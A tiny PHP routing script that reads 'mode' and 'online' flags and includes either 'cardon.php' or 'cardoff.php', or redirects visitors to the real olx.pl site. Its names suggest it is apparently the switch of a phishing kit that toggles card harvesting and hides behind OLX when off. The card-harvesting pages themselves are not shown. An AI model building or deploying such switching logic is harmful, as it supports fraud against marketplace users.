<?

$mode = file_get_contents('../api/mode.txt');
$status = file_get_contents('../api/online.txt');

if($status == 'siteon') {
if ($mode == 'cardon') {
    require_once('cardon.php');
} else {
    require_once('cardoff.php');
}
} else {
    header('location: https://www.olx.pl/');
}

?>